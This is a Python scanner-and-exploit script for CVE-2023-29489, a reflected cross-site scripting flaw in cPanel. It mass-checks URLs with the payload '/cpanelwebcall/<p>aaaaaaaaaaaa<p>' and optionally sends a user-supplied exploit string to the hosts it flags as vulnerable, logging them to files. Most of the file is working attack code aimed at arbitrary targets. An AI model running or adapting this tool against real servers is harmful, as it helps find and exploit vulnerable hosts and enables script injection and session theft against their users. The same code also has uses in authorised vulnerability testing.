import argparse
import requests

def display_name():
    print("""
████████╗░█████╗░░█████╗░██╗░░░░░░░░░░░██████╗░░█████╗░░░██╗██╗░█████╗░░█████╗░
╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░░░░░░░╚════██╗██╔══██╗░██╔╝██║██╔══██╗██╔══██╗
░░░██║░░░██║░░██║██║░░██║██║░░░░░█████╗░░███╔═╝╚██████║██╔╝░██║╚█████╔╝╚██████║
░░░██║░░░██║░░██║██║░░██║██║░░░░░╚════╝██╔══╝░░░╚═══██║███████║██╔══██╗░╚═══██║
░░░██║░░░╚█████╔╝╚█████╔╝███████╗░░░░░░███████╗░█████╔╝╚════██║╚█████╔╝░█████╔╝
░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝░░░░░░╚══════╝░╚════╝░░░░░░╚═╝░╚════╝░░╚════╝░""")

def banner():
    print("""
████████╗░█████╗░░█████╗░██╗░░░░░░░░░░░██████╗░░█████╗░░░██╗██╗░█████╗░░█████╗░
╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░░░░░░░╚════██╗██╔══██╗░██╔╝██║██╔══██╗██╔══██╗
░░░██║░░░██║░░██║██║░░██║██║░░░░░█████╗░░███╔═╝╚██████║██╔╝░██║╚█████╔╝╚██████║
░░░██║░░░██║░░██║██║░░██║██║░░░░░╚════╝██╔══╝░░░╚═══██║███████║██╔══██╗░╚═══██║
░░░██║░░░╚█████╔╝╚█████╔╝███████╗░░░░░░███████╗░█████╔╝╚════██║╚█████╔╝░█████╔╝
░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝░░░░░░╚══════╝░╚════╝░░░░░░╚═╝░╚════╝░░╚════╝░""")
    print("\n\n\n")

    print("""
        This Tool is used to check for CVE-2023-29489 Vulnerabilty in the provided URL with the set of payloads available
        To use tool-29489:
          tool-29489 [help] [URL] [inputfile] [outputfile] [exploit]
          -h or --help            : To display help options.
          -u or --url             : To input URL to check.
          -i or --input           : To give the input file.
          -o or --output          : To give the output file.
          -e or --exploit         : To send exploit and provide result.
          -ef or --exploit_output : To write the exploited URL to a file.
""")

# def custom_formatter(prog):
#     return argparse.HelpFormatter(prog, width=1000)

# parser = argparse.ArgumentParser(description=banner(), formatter_class=custom_formatter, add_help=False,usage=argparse.SUPPRESS)

parser = argparse.ArgumentParser(add_help=False,usage=argparse.SUPPRESS)

parser.add_argument('-h', '--help', nargs='?', const=True, help="Display help options.")
parser.add_argument('-u','--url')
parser.add_argument('-i','--input')
parser.add_argument('-o','--output')
parser.add_argument('-e','--exploit')
parser.add_argument('-ef','--exploit_output')

args = parser.parse_args()

help = args.help
exploit = args.exploit
exploit_output_file = args.exploit_output
url = args.url
input_file = args.input
output_file = args.output 

def exploit_url(url,outfile="exploit_output.txt"):
    vuln_url = url+exploit
    response = requests.get(vuln_url)
    if exploit in response.text:
        print("Exploited URL -> "+vuln_url)
        writetofile(vuln_url,outfile)


def file_reader(input_file,output_file):
    with open(input_file,'r') as file:
        for url in file.readlines():
            scanner(url.strip(),output_file)

def writetofile(vuln_url,outname):
    if outname:
        pass
    else:
        outname = 'output.txt'

    with open(outname,'a') as file:
        file.write(vuln_url+"\n")
        
payloads = ['/cpanelwebcall/<p>aaaaaaaaaaaa<p>']

def scanner(url,output_file):
    for payload in payloads:
        fullurl = url+payload
        response = requests.get(fullurl)
        if response.status_code == 400:
            if 'aaaaaaaaaaaa' in response.text:
                writetofile(fullurl,output_file)
                print("Vulnerable URL -> "+fullurl)
                if exploit:
                    exploit_url(fullurl,exploit_output_file)




def main():
    if help:
        banner()
    elif url:
        display_name()
        scanner(url,output_file)
    elif input_file:
        display_name()
        file_reader(input_file,output_file)
    else:
        banner()
if __name__=="__main__":
    main()
    